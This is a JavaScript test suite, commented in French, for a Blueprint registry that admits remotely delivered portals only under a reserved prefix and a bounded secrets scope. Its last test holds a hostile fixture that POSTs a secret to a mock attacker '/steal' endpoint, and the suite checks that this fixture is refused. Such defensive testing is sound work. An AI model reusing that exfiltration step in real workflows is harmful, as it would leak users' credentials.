/**
 * Ce qui a le droit d'**entrer** — la porte du jalon 3-H.
 *
 * Le jalon 3-F ne laissait le manifeste que *mettre a jour* des noms embarques. Ce fichier fige la
 * levee de cette regle : opt-in (`allowNew`), bornee par un **prefixe reserve** et par un
 * **perimetre de secrets obligatoire**, et reversible — retirer la capacite doit *desinstaller* ce
 * qu'elle avait laisse entrer.
 *
 * Deux promesses portent tout le fichier, et ce sont elles qu'on protege :
 *
 *   1. **Une application qui n'active pas la capacite ne bouge pas d'un cheveu**, y compris face a
 *      un manifeste plein de noms qu'elle ne connait pas. Le format de manifeste ne change pas :
 *      c'est ce qui permet a un publieur d'ecrire pour les deux a la fois.
 *   2. **Un nom nouveau n'assouplit rien pour un nom existant.** Le prefixe *ajoute* des portes, il
 *      n'en elargit aucune.
 *
 * Les gardes communes (empreinte, cache corrompu, exfiltration par les secrets du socle) vivent dans
 * `delivery-guards.test.js` ; ici on ne teste que ce qui distingue un nom **ajoute** d'un nom
 * **corrige**.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { Aetherius } from "../dist/aetherius.js";
import { staticSecrets } from "../dist/secrets/index.js";
import { BlueprintRegistry } from "../dist/delivery/registry.js";
import { memoryCache } from "../dist/delivery/cache.js";
import { MANIFEST_URL, cdn, digest, document, manifest, text } from "./delivery-support.mjs";
import { htmlServer } from "./support.mjs";

/** Le socle : un seul Blueprint embarque, hors du prefixe reserve. */
const BUNDLED = "demo.delivery";
/** Le portail ajoute a distance : sous le prefixe, absent du binaire. */
const PORTAL = "demo.portail.bordeaux";
/** Publie dans le meme manifeste, hors prefixe : il ne doit jamais entrer. */
const STRANGER = "demo.autre.chose";

const PREFIX = "demo.portail.";
const PORTAL_URL = "https://cdn.example.test/aetherius/portail.json";
const STRANGER_URL = "https://cdn.example.test/aetherius/autre.json";

const portal = text(document(PORTAL, { marker: "portail-v1" }));
const stranger = text(document(STRANGER, { marker: "etranger-v1" }));

/** Un registre branche sur un CDN double, avec le socle que chaque cas prend pour point de depart. */
function registry(routes, extra = {}) {
  const store = extra.cache ?? memoryCache();
  const network = cdn(routes);
  const subject = new BlueprintRegistry({
    bundled: { [BUNDLED]: { version: "1", document: document(BUNDLED, { marker: "bundled-v1" }) } },
    manifest: MANIFEST_URL,
    cache: store,
    fetch: network.fetch,
    allowNew: { prefix: PREFIX, secrets: ["portail_user", "portail_pass"] },
    ...extra,
  });
  return { subject, network, store };
}

/** Le manifeste que tous les cas publient : un portail couvert, et un intrus hors prefixe. */
const BOTH = {
  [MANIFEST_URL]: manifest({
    [PORTAL]: { version: "1", url: PORTAL_URL, body: portal },
    [STRANGER]: { version: "1", url: STRANGER_URL, body: stranger },
  }),
  [PORTAL_URL]: portal,
  [STRANGER_URL]: stranger,
};

const outcomeOf = (report, name) => report.entries.find((entry) => entry.name === name);

test("a name the application never bundled is delivered when the prefix covers it", async () => {
  // Le cas qui justifie le jalon : ajouter un portail sans publier sur les stores.
  const { subject } = registry(BOTH);

  const report = await subject.refresh();
  assert.deepEqual(outcomeOf(report, PORTAL), { name: PORTAL, outcome: "updated", version: "1" });

  const resolved = await subject.resolve(PORTAL);
  assert.equal(resolved.origin, "remote");
  assert.equal(resolved.version, "1");
  assert.equal(resolved.blueprint.steps[0].value, "portail-v1");
});

test("the same manifest, read by an application without allowNew, behaves exactly as before", async () => {
  // Le critere d'acceptation du jalon : le format ne change pas, et une application qui n'active
  // pas la capacite ignore simplement ce qu'elle n'embarque pas.
  const { subject } = registry(BOTH, { allowNew: undefined });

  const report = await subject.refresh();
  assert.equal(report.ok, true);
  for (const name of [PORTAL, STRANGER]) {
    assert.equal(outcomeOf(report, name).outcome, "ignored");
    assert.match(outcomeOf(report, name).reason, /not bundled in this application/);
    await assert.rejects(() => subject.resolve(name), { name: "BlueprintLoadError" });
  }
});

test("a name outside the prefix stays out, and the report says why", async () => {
  const { subject } = registry(BOTH);

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, STRANGER).outcome, "ignored");
  assert.match(outcomeOf(report, STRANGER).reason, /outside the reserved prefix 'demo\.portail\.'/);

  const error = await subject.resolve(STRANGER).catch((cause) => cause);
  assert.equal(error.name, "BlueprintLoadError");
  assert.match(error.message, /outside 'demo\.portail\.'/);
});

test("a delivered name declaring a secret outside allowNew.secrets is refused before the cache", async () => {
  // Le perimetre est la vraie limite du rayon : sans lui, un fichier que personne n'a relu pourrait
  // reclamer le trousseau et l'exfiltrer par une simple requete.
  const greedy = text(document(PORTAL, { secrets: ["portail_user", "cas_pass"] }));
  const { subject } = registry({
    [MANIFEST_URL]: manifest({ [PORTAL]: { version: "1", url: PORTAL_URL, body: greedy } }),
    [PORTAL_URL]: greedy,
  });

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, PORTAL).outcome, "rejected");
  assert.match(outcomeOf(report, PORTAL).reason, /cas_pass/);
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("the scope of a new name is allowNew.secrets alone, never the bundle's union", async () => {
  // Un socle qui declare `cas_pass` n'ouvre rien au portail : les deux perimetres ne se melangent
  // pas, sinon `allowNew.secrets` ne serait qu'une decoration.
  const greedy = text(document(PORTAL, { secrets: ["cas_pass"] }));
  const subject = new BlueprintRegistry({
    bundled: {
      [BUNDLED]: { version: "1", document: document(BUNDLED, { secrets: ["cas_pass"] }) },
    },
    manifest: MANIFEST_URL,
    cache: memoryCache(),
    fetch: cdn({
      [MANIFEST_URL]: manifest({ [PORTAL]: { version: "1", url: PORTAL_URL, body: greedy } }),
      [PORTAL_URL]: greedy,
    }).fetch,
    allowNew: { prefix: PREFIX, secrets: ["portail_user"] },
  });

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, PORTAL).outcome, "rejected");
  assert.match(outcomeOf(report, PORTAL).reason, /allowed: portail_user/);
});

test("a delivered name this engine cannot run is refused before the cache", async () => {
  const impossible = text(
    document(PORTAL, {
      act: "continuum",
      steps: [{ id: "grab", action: "upload", selector: "#f", file: "/tmp/x" }],
    }),
  );
  const { subject } = registry({
    [MANIFEST_URL]: manifest({ [PORTAL]: { version: "1", url: PORTAL_URL, body: impossible } }),
    [PORTAL_URL]: impossible,
  });

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, PORTAL).outcome, "rejected");
  assert.match(outcomeOf(report, PORTAL).reason, /upload/);
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("a delivered name that violates the schema is refused before the cache", async () => {
  const broken = JSON.stringify({ aetherius: "1.0", name: PORTAL, act: "vector" });
  const { subject } = registry({
    [MANIFEST_URL]: manifest({ [PORTAL]: { version: "1", url: PORTAL_URL, body: broken } }),
    [PORTAL_URL]: broken,
  });

  assert.equal(outcomeOf(await subject.refresh(), PORTAL).outcome, "rejected");
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("a portal written for a newer engine is ignored, silently", async () => {
  // C'est ici que `min_engine` prend tout son sens : on publie un portail pour les applications
  // recentes sans avoir a se demander qui l'executera.
  const { subject } = registry(
    {
      [MANIFEST_URL]: manifest({
        [PORTAL]: { version: "1", url: PORTAL_URL, body: portal, min_engine: "9.0.0" },
      }),
      [PORTAL_URL]: portal,
    },
    { engineVersion: "0.5.1" },
  );

  const report = await subject.refresh();
  assert.equal(report.ok, true);
  assert.equal(outcomeOf(report, PORTAL).outcome, "ignored");
  assert.match(outcomeOf(report, PORTAL).reason, /needs engine 9\.0\.0/);
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("a portal whose digest does not match never reaches the cache", async () => {
  const { subject, store } = registry({
    [MANIFEST_URL]: manifest({
      [PORTAL]: { version: "1", url: PORTAL_URL, body: portal, sha256: digest("something else") },
    }),
    [PORTAL_URL]: portal,
  });

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, PORTAL).outcome, "rejected");
  assert.match(outcomeOf(report, PORTAL).reason, /integrity check failed/);
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });

  const fresh = new BlueprintRegistry({ bundled: {}, cache: store, allowNew: { prefix: PREFIX, secrets: [] } });
  assert.deepEqual(await fresh.list(), []);
});

test("dropping allowNew uninstalls what it let in, without a network", async () => {
  // Un interrupteur d'arret qui laisse en place ce qu'il a laisse entrer n'en est pas un.
  const { subject, store } = registry(BOTH);
  await subject.refresh();
  assert.equal((await subject.resolve(PORTAL)).origin, "remote");

  const without = new BlueprintRegistry({
    bundled: { [BUNDLED]: { version: "1", document: document(BUNDLED) } },
    cache: store,
  });
  await assert.rejects(() => without.resolve(PORTAL), { name: "BlueprintLoadError" });
  assert.deepEqual(
    (await without.list()).map((entry) => entry.name),
    [BUNDLED],
  );

  // Et la purge est **durable** : un registre qui rouvrirait la porte ne retrouve rien.
  const reopened = registry({}, { cache: store }).subject;
  await assert.rejects(() => reopened.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("narrowing the prefix uninstalls what the old one had let in", async () => {
  const { subject, store } = registry(BOTH);
  await subject.refresh();

  const narrowed = registry({}, { cache: store, allowNew: { prefix: "demo.portail.paris.", secrets: [] } });
  await assert.rejects(() => narrowed.subject.resolve(PORTAL), { name: "BlueprintLoadError" });
  assert.deepEqual(narrowed.network.calls, []);
});

test("a name that is both bundled and covered keeps the 3-F rule: strictly newer wins", async () => {
  // Le prefixe ajoute des noms ; il n'assouplit rien pour ceux qui existent deja.
  const covered = `${PREFIX}bundled`;
  const stale = text(document(covered, { marker: "remote-v1" }));
  const network = cdn({
    [MANIFEST_URL]: manifest({ [covered]: { version: "1", url: PORTAL_URL, body: stale } }),
    [PORTAL_URL]: stale,
  });
  const subject = new BlueprintRegistry({
    bundled: { [covered]: { version: "2", document: document(covered, { marker: "bundled-v2" }) } },
    manifest: MANIFEST_URL,
    cache: memoryCache(),
    fetch: network.fetch,
    allowNew: { prefix: PREFIX, secrets: [] },
  });

  const report = await subject.refresh();
  assert.equal(outcomeOf(report, covered).outcome, "ignored");
  assert.match(outcomeOf(report, covered).reason, /not newer than the bundled 2/);
  assert.equal((await subject.resolve(covered)).origin, "bundled");
});

test("list() shows what arrived through the door, after what the binary ships", async () => {
  const { subject } = registry(BOTH);
  await subject.refresh();

  assert.deepEqual(await subject.list(), [
    { name: BUNDLED, version: "1", origin: "bundled" },
    { name: PORTAL, version: "1", origin: "remote" },
  ]);
});

test("an entry gone from the manifest is uninstalled, and says so", async () => {
  const { subject, network } = registry(BOTH);
  await subject.refresh();

  network.put(MANIFEST_URL, manifest({}));
  const report = await subject.refresh();
  assert.equal(outcomeOf(report, PORTAL).outcome, "ignored");
  assert.match(outcomeOf(report, PORTAL).reason, /uninstalled/);
  await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });
});

test("a prefix that would cover the bundle is refused at construction", () => {
  // Refuser tot et bruyamment vaut mieux qu'une surface ouverte par inadvertance : `demo` couvrirait
  // `demo.delivery`, c'est-a-dire precisement le Blueprint que l'application embarque.
  const build = (allowNew) => () => new BlueprintRegistry({ bundled: {}, allowNew });

  assert.throws(build({ prefix: "", secrets: [] }), { name: "BlueprintValidationError" });
  assert.throws(build({ prefix: "demo", secrets: [] }), /must end with '\.'/);
  assert.throws(build({ prefix: "demo-portail-", secrets: [] }), /must end with '\.'/);
  assert.throws(build({ secrets: [] }), { name: "BlueprintValidationError" });
  assert.throws(build({ prefix: PREFIX }), /allowNew\.secrets is required/);
  assert.throws(build({ prefix: PREFIX, secrets: "portail_user" }), /allowNew\.secrets is required/);

  // Un perimetre vide est une reponse valide, et la plus restrictive.
  assert.doesNotThrow(build({ prefix: PREFIX, secrets: [] }));
});

test("an added portal cannot exfiltrate: refused, never run, nothing reaches the attacker", async () => {
  // Le pendant du jalon 3-F, joue sur la porte que 3-H ouvre : le fichier n'a ete relu par
  // personne, donc la seule question qui compte est ce qu'il obtient. Reponse : rien.
  const received = [];
  const attacker = await htmlServer({
    "/steal": ({ body }) => {
      received.push(body);
      return { body: "ok" };
    },
  });

  try {
    const hostile = text(
      document(PORTAL, {
        secrets: ["cas_pass"],
        steps: [
          {
            id: "leak",
            action: "http.request",
            method: "POST",
            url: `${attacker.baseUrl}/steal`,
            form: { stolen: "{{ secrets.cas_pass }}" },
          },
        ],
      }),
    );
    const { subject } = registry({
      [MANIFEST_URL]: manifest({ [PORTAL]: { version: "1", url: PORTAL_URL, body: hostile } }),
      [PORTAL_URL]: hostile,
    });

    assert.equal(outcomeOf(await subject.refresh(), PORTAL).outcome, "rejected");
    await assert.rejects(() => subject.resolve(PORTAL), { name: "BlueprintLoadError" });

    const client = new Aetherius({ secrets: staticSecrets({ cas_pass: "hunter2" }) });
    const fallback = await subject.resolve(BUNDLED);
    const result = await client.run(fallback.blueprint);
    assert.equal(result.status, "success");
    assert.deepEqual(received, []);
  } finally {
    await attacker.close();
  }
});
